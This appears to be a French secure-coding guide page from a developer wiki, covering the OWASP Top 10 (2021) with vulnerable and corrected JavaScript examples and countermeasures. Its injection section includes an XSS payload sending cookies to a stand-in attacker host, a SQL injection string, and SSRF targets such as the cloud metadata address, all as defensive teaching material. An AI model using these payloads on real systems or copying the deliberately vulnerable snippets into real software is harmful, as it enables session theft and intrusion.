@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="fr" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>OWASP Top 10 - Le Codex</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+        <link href="../../extra.css" rel="stylesheet" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "OWASP Top 10";
+        var mkdocs_page_input_path = "dev-securite/owasp.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../..">
+          <img src="../../logo.png" class="logo" alt="Logo"/>
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">ACCUEIL</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../mkdocs/">Site avec MkDocs</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dev langages</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/angular/">Angular</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/bash/">Bash</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/css/">CSS</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/git/">Git</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/html/">HTML5</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/javascript/">JavaScript</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/node/">Node.js</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/php/">PHP</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/pwa/">PWA</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/python/">Python</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/react/">React</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/regex/">RegEx</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/sql/">SQL</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/typescript/">TypeScript</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-langages/yaml/">YAML</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dev ops</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-ops/ci-cd/">CI/CD</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-ops/concept-reseau/">Concepts de réseau essentiels</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-ops/docker/">Docker</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-ops/linux-file-system/">Système de fichiers Linux</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-ops/nginx-ssl/">Configuration d'un serveur web Nginx avec SSL</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-ops/ssh/">SSH</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-ops/winscp/">Mise en ligne avec WinSCP</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dev securite</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../jwt-auth/">JWT — Authentification</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">OWASP Top 10</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#a01-broken-access-control">A01 — Broken Access Control</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a02-cryptographic-failures">A02 — Cryptographic Failures</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a03-injection">A03 — Injection</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a04-insecure-design">A04 — Insecure Design</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a05-security-misconfiguration">A05 — Security Misconfiguration</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a06-vulnerable-and-outdated-components">A06 — Vulnerable and Outdated Components</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a07-identification-and-authentication-failures">A07 — Identification and Authentication Failures</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a08-software-and-data-integrity-failures">A08 — Software and Data Integrity Failures</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a09-security-logging-and-monitoring-failures">A09 — Security Logging and Monitoring Failures</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#a10-server-side-request-forgery-ssrf">A10 — Server-Side Request Forgery (SSRF)</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#checklist-rapide">Checklist rapide</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../secrets/">Gestion des secrets</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dev tests</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-tests/concepts/">Concepts de tests</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-tests/jest/">Jest</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dev-tests/playwright/">Playwright</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Gestion de projet</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../gestion-de-projet/gitflow/">Gitflow</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../gestion-de-projet/guide-scrum/">Le guide de Référence de Scrum : Les règles du jeu</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../gestion-de-projet/kanban/">Kanban</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Ia generative</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../ia-generative/claude-code/">Claude Code — Protocoles &amp; méthodes avancées</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../ia-generative/concepts-fondamentaux/">Concepts fondamentaux de l'IA générative</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../ia-generative/n8n/">n8n</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../ia-generative/ollama/">Configurer Ollama</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../ia-generative/prompt-engineering/">Prompt Engineering</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Liens utiles</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../liens-utiles/low-code-no-code/">Low-code &amp; no-code</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../liens-utiles/outils-design/">Outils pour le design</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../liens-utiles/outils-dev/">Outils pour le développement</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Le Codex</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Dev securite</li>
+      <li class="breadcrumb-item active">OWASP Top 10</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="owasp-top-10">OWASP Top 10</h1>
+<p>L'OWASP (Open Worldwide Application Security Project) publie le classement des 10 risques de sécurité les plus critiques pour les applications web. Cette liste (édition 2021) est la référence mondiale pour les développeurs et auditeurs sécurité.</p>
+<hr />
+<h2 id="a01-broken-access-control">A01 — Broken Access Control</h2>
+<p><strong>Contrôle d'accès défaillant</strong> — un utilisateur accède à des ressources ou actions qui ne lui sont pas autorisées.</p>
+<pre><code class="language-js">// ❌ Vulnérable : l'utilisateur modifie son propre ID dans l'URL
+// GET /api/utilisateurs/42/commandes
+app.get('/api/utilisateurs/:id/commandes', async (req, res) =&gt; {
+  const commandes = await db.query(
+    'SELECT * FROM commandes WHERE user_id = ?', [req.params.id]
+  );
+  res.json(commandes);
+});
+
+// ✅ Corrigé : vérifier que l'ID correspond à l'utilisateur connecté
+app.get('/api/utilisateurs/:id/commandes', authentifie, async (req, res) =&gt; {
+  if (req.user.id !== parseInt(req.params.id)) {
+    return res.status(403).json({ erreur: 'Accès interdit' });
+  }
+  const commandes = await db.query(
+    'SELECT * FROM commandes WHERE user_id = ?', [req.user.id]
+  );
+  res.json(commandes);
+});
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Appliquer le principe du moindre privilège (refuser par défaut)
+- Vérifier les droits côté serveur à chaque requête, jamais uniquement côté client
+- Désactiver le listage de répertoires sur le serveur web
+- Invalider les tokens JWT à la déconnexion
+- Journaliser les échecs de contrôle d'accès</p>
+<hr />
+<h2 id="a02-cryptographic-failures">A02 — Cryptographic Failures</h2>
+<p><strong>Défaillances cryptographiques</strong> — données sensibles exposées en clair ou mal protégées (mots de passe, données bancaires, données de santé).</p>
+<pre><code class="language-js">// ❌ Vulnérable : mot de passe stocké en MD5 (cassable par rainbow table)
+const hash = crypto.createHash('md5').update(motDePasse).digest('hex');
+
+// ❌ Vulnérable : mot de passe stocké en SHA256 sans sel
+const hash = crypto.createHash('sha256').update(motDePasse).digest('hex');
+
+// ✅ Corrigé : bcrypt avec facteur de coût adapté
+const bcrypt = require('bcrypt');
+const hash = await bcrypt.hash(motDePasse, 12);  // coût 12 = ~250ms
+
+// Vérification
+const valide = await bcrypt.compare(motDePasseSaisi, hashStocke);
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Ne jamais stocker de mots de passe en clair — utiliser bcrypt, Argon2 ou scrypt
+- Chiffrer les données sensibles au repos (AES-256) et en transit (TLS 1.2+)
+- Ne pas utiliser MD5 ou SHA1 pour les mots de passe
+- Utiliser HTTPS partout, configurer HSTS
+- Ne pas stocker de données sensibles inutiles</p>
+<hr />
+<h2 id="a03-injection">A03 — Injection</h2>
+<p><strong>Injection</strong> — des données non validées sont interprétées comme des commandes (SQL, OS, LDAP, XSS…).</p>
+<pre><code class="language-js">// ❌ Vulnérable : injection SQL
+// Saisie malveillante : ' OR '1'='1
+const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
+// → renvoie tous les utilisateurs !
+
+// ✅ Corrigé : requête préparée (paramètres liés)
+const [rows] = await db.execute(
+  'SELECT * FROM users WHERE email = ? AND password = ?',
+  [email, password]
+);
+</code></pre>
+<pre><code class="language-js">// ❌ Vulnérable : XSS (Cross-Site Scripting) stocké
+// Un commentaire contient : &lt;script&gt;document.location='https://attaquant.com/?c='+document.cookie&lt;/script&gt;
+element.innerHTML = commentaireUtilisateur;
+
+// ✅ Corrigé : échapper le contenu HTML
+element.textContent = commentaireUtilisateur;  // pas d'interprétation HTML
+
+// Ou avec une librairie d'assainissement
+const DOMPurify = require('dompurify');
+element.innerHTML = DOMPurify.sanitize(commentaireUtilisateur);
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Toujours utiliser des requêtes préparées ou des ORM pour les requêtes SQL
+- Valider et assainir toutes les entrées utilisateur côté serveur
+- Échapper les sorties HTML (utiliser <code>textContent</code> plutôt qu'<code>innerHTML</code>)
+- Appliquer une Content Security Policy (CSP)
+- Utiliser des linters de sécurité (ESLint security plugin)</p>
+<hr />
+<h2 id="a04-insecure-design">A04 — Insecure Design</h2>
+<p><strong>Conception non sécurisée</strong> — vulnérabilités issues d'une mauvaise conception en amont, pas corrigeables par simple patch.</p>
+<pre><code>// ❌ Conception vulnérable : réinitialisation de mot de passe par question secrète
+&quot;Quel est le nom de votre animal de compagnie ?&quot;
+→ Facilement devinable via les réseaux sociaux
+
+// ✅ Conception correcte : token unique à usage unique et durée limitée
+POST /api/reset-password
+→ Envoie un token signé (JWT ou UUID) valable 15 minutes
+→ Token invalidé après utilisation
+→ Tentatives limitées (rate limiting)
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Intégrer la sécurité dès la phase de conception (Secure by Design)
+- Modéliser les menaces (threat modeling) sur les flux sensibles
+- Limiter les ressources par utilisateur (rate limiting, quotas)
+- Séparer les environnements (prod/staging/dev)
+- Définir des cas d'abus en plus des cas d'usage</p>
+<hr />
+<h2 id="a05-security-misconfiguration">A05 — Security Misconfiguration</h2>
+<p><strong>Mauvaise configuration de sécurité</strong> — paramètres par défaut non modifiés, fonctionnalités inutiles activées, messages d'erreur trop verbeux.</p>
+<pre><code class="language-js">// ❌ Vulnérable : stack trace exposée en production
+app.use((err, req, res, next) =&gt; {
+  res.status(500).json({ erreur: err.stack });  // révèle chemins, versions, logique interne
+});
+
+// ✅ Corrigé : message générique en production
+app.use((err, req, res, next) =&gt; {
+  console.error(err);  // log interne uniquement
+  res.status(500).json({ erreur: 'Erreur interne du serveur' });
+});
+</code></pre>
+<pre><code class="language-js">// ❌ Headers par défaut d'Express révèlent la stack technique
+// X-Powered-By: Express
+
+// ✅ Supprimer les headers inutiles avec helmet
+const helmet = require('helmet');
+app.use(helmet());
+app.disable('x-powered-by');
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Supprimer les fonctionnalités, pages et comptes inutiles
+- Changer tous les mots de passe et clés par défaut
+- Désactiver les messages d'erreur détaillés en production
+- Utiliser <code>helmet</code> (Node.js) ou équivalent pour sécuriser les headers HTTP
+- Maintenir un processus de revue de configuration régulier</p>
+<hr />
+<h2 id="a06-vulnerable-and-outdated-components">A06 — Vulnerable and Outdated Components</h2>
+<p><strong>Composants vulnérables ou obsolètes</strong> — utilisation de bibliothèques, frameworks ou dépendances avec des vulnérabilités connues.</p>
+<pre><code class="language-bash"># ❌ Dépendances jamais auditées ni mises à jour
+npm install  # et on oublie
+
+# ✅ Audit régulier des vulnérabilités
+npm audit
+npm audit fix          # corriger automatiquement
+npm audit fix --force  # ⚠️ peut introduire des breaking changes
+
+# Vérifier les dépendances obsolètes
+npm outdated
+
+# Outil tiers pour surveillance continue
+npx snyk test
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Exécuter <code>npm audit</code> (ou équivalent) à chaque PR et en CI
+- Configurer Dependabot ou Renovate pour les mises à jour automatiques
+- Supprimer les dépendances non utilisées
+- Ne pas utiliser des packages abandonnés ou sans maintenance
+- Surveiller les CVE (Common Vulnerabilities and Exposures) des dépendances critiques</p>
+<hr />
+<h2 id="a07-identification-and-authentication-failures">A07 — Identification and Authentication Failures</h2>
+<p><strong>Défaillances d'authentification</strong> — mots de passe faibles, absence de MFA, sessions mal gérées, tokens prévisibles.</p>
+<pre><code class="language-js">// ❌ Vulnérable : pas de limitation des tentatives de connexion (brute force)
+app.post('/login', async (req, res) =&gt; {
+  const user = await verifierIdentifiants(req.body.email, req.body.password);
+  if (user) res.json({ token: genererToken(user) });
+  else res.status(401).json({ erreur: 'Identifiants invalides' });
+});
+
+// ✅ Corrigé : rate limiting + verrouillage de compte
+const rateLimit = require('express-rate-limit');
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,  // 15 minutes
+  max: 5,                      // 5 tentatives max
+  message: 'Trop de tentatives, réessayez dans 15 minutes',
+});
+
+app.post('/login', loginLimiter, async (req, res) =&gt; {
+  // ...
+});
+</code></pre>
+<pre><code class="language-js">// ❌ Vulnérable : secret JWT faible ou hardcodé
+const token = jwt.sign(payload, 'secret');
+
+// ✅ Corrigé : secret fort depuis les variables d'environnement + expiration courte
+const token = jwt.sign(payload, process.env.JWT_SECRET, {
+  expiresIn: '15m',     // courte durée pour les access tokens
+  algorithm: 'HS256',
+});
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Imposer des mots de passe forts (min. 12 caractères, vérification contre les listes de mots de passe compromis)
+- Implémenter le MFA (Multi-Factor Authentication)
+- Limiter les tentatives de connexion (rate limiting, CAPTCHA)
+- Invalider les sessions à la déconnexion et après inactivité
+- Utiliser des tokens d'accès à courte durée de vie + refresh tokens</p>
+<hr />
+<h2 id="a08-software-and-data-integrity-failures">A08 — Software and Data Integrity Failures</h2>
+<p><strong>Défaillances d'intégrité</strong> — code ou données modifiés sans vérification (dépendances non vérifiées, pipelines CI/CD compromis, désérialisation non sécurisée).</p>
+<pre><code class="language-js">// ❌ Vulnérable : désérialisation sans validation du type
+app.post('/api/data', (req, res) =&gt; {
+  const obj = JSON.parse(req.body);  // peut déclencher des gadget chains si objet complexe
+  processData(obj);
+});
+
+// ❌ Vulnérable : script externe sans vérification d'intégrité (HTML)
+&lt;script src=&quot;https://cdn.externe.com/lib.js&quot;&gt;&lt;/script&gt;
+
+// ✅ Corrigé : Subresource Integrity (SRI)
+&lt;script
+  src=&quot;https://cdn.externe.com/lib.js&quot;
+  integrity=&quot;sha384-xxxx...&quot;
+  crossorigin=&quot;anonymous&quot;&gt;
+&lt;/script&gt;
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Vérifier les signatures des packages (npm provenance, checksums)
+- Utiliser Subresource Integrity (SRI) pour les ressources CDN
+- Valider et typer strictement les données désérialisées
+- Sécuriser le pipeline CI/CD (accès, secrets, revue des workflows)
+- Ne pas désérialiser des données provenant de sources non fiables</p>
+<hr />
+<h2 id="a09-security-logging-and-monitoring-failures">A09 — Security Logging and Monitoring Failures</h2>
+<p><strong>Défaillances de journalisation</strong> — activités suspectes non détectées faute de logs, ou logs insuffisamment détaillés pour investiguer un incident.</p>
+<pre><code class="language-js">// ❌ Vulnérable : aucun log des événements de sécurité
+app.post('/login', async (req, res) =&gt; {
+  const user = await verifierIdentifiants(req.body.email, req.body.password);
+  if (!user) return res.status(401).json({ erreur: 'Identifiants invalides' });
+  res.json({ token: genererToken(user) });
+});
+
+// ✅ Corrigé : journalisation des événements critiques
+app.post('/login', async (req, res) =&gt; {
+  const user = await verifierIdentifiants(req.body.email, req.body.password);
+  if (!user) {
+    logger.warn('Échec de connexion', {
+      email: req.body.email,
+      ip: req.ip,
+      userAgent: req.headers['user-agent'],
+      timestamp: new Date().toISOString(),
+    });
+    return res.status(401).json({ erreur: 'Identifiants invalides' });
+  }
+  logger.info('Connexion réussie', { userId: user.id, ip: req.ip });
+  res.json({ token: genererToken(user) });
+});
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Journaliser : connexions (succès/échec), accès aux données sensibles, erreurs, changements de configuration
+- Ne jamais logger de données sensibles (mots de passe, tokens, numéros de carte)
+- Centraliser les logs (ELK, Datadog, CloudWatch) et configurer des alertes
+- Conserver les logs suffisamment longtemps (min. 90 jours recommandé)
+- Tester régulièrement que les alertes fonctionnent</p>
+<hr />
+<h2 id="a10-server-side-request-forgery-ssrf">A10 — Server-Side Request Forgery (SSRF)</h2>
+<p><strong>Falsification de requête côté serveur</strong> — le serveur est manipulé pour envoyer des requêtes vers des ressources internes non accessibles depuis l'extérieur.</p>
+<pre><code class="language-js">// ❌ Vulnérable : le serveur fetche une URL fournie par l'utilisateur
+// Attaque : url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
+// Attaque : url=http://localhost:6379/ (Redis interne)
+app.get('/proxy', async (req, res) =&gt; {
+  const { url } = req.query;
+  const response = await fetch(url);  // fetch interne non contrôlé !
+  res.send(await response.text());
+});
+
+// ✅ Corrigé : liste blanche des domaines autorisés
+const DOMAINES_AUTORISES = ['api.exemple.com', 'cdn.exemple.com'];
+
+app.get('/proxy', async (req, res) =&gt; {
+  const { url } = req.query;
+  const parsed = new URL(url);
+
+  if (!DOMAINES_AUTORISES.includes(parsed.hostname)) {
+    return res.status(400).json({ erreur: 'URL non autorisée' });
+  }
+
+  const response = await fetch(url);
+  res.send(await response.text());
+});
+</code></pre>
+<p><strong>Contre-mesures :</strong>
+- Valider et filtrer toutes les URLs fournies par l'utilisateur
+- Utiliser une liste blanche de domaines/IPs autorisés (pas une liste noire)
+- Désactiver les redirections HTTP dans les requêtes serveur
+- Bloquer les plages IP internes (10.x.x.x, 172.16.x.x, 192.168.x.x, 127.x.x.x, 169.254.x.x)
+- Segmenter le réseau pour limiter l'accès aux services internes</p>
+<hr />
+<h2 id="checklist-rapide">Checklist rapide</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Vulnérabilité</th>
+<th>Vérification rapide</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A01</td>
+<td>Broken Access Control</td>
+<td>Les droits sont vérifiés côté serveur à chaque requête ?</td>
+</tr>
+<tr>
+<td>A02</td>
+<td>Cryptographic Failures</td>
+<td>Mots de passe hashés avec bcrypt/Argon2 ? HTTPS activé ?</td>
+</tr>
+<tr>
+<td>A03</td>
+<td>Injection</td>
+<td>Requêtes préparées ? Entrées assainies ? CSP configurée ?</td>
+</tr>
+<tr>
+<td>A04</td>
+<td>Insecure Design</td>
+<td>Threat modeling effectué ? Rate limiting sur les flux sensibles ?</td>
+</tr>
+<tr>
+<td>A05</td>
+<td>Security Misconfiguration</td>
+<td>Headers de sécurité activés ? Stack trace masquée en prod ?</td>
+</tr>
+<tr>
+<td>A06</td>
+<td>Outdated Components</td>
+<td><code>npm audit</code> en CI ? Dependabot configuré ?</td>
+</tr>
+<tr>
+<td>A07</td>
+<td>Auth Failures</td>
+<td>Rate limiting sur le login ? Tokens avec expiration courte ?</td>
+</tr>
+<tr>
+<td>A08</td>
+<td>Integrity Failures</td>
+<td>SRI sur les CDN ? Pipeline CI/CD sécurisé ?</td>
+</tr>
+<tr>
+<td>A09</td>
+<td>Logging Failures</td>
+<td>Événements de sécurité journalisés ? Alertes configurées ?</td>
+</tr>
+<tr>
+<td>A10</td>
+<td>SSRF</td>
+<td>URLs utilisateur validées contre une liste blanche ?</td>
+</tr>
+</tbody>
+</table>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../jwt-auth/" class="btn btn-neutral float-left" title="JWT — Authentification"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../secrets/" class="btn btn-neutral float-right" title="Gestion des secrets">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../jwt-auth/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../secrets/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
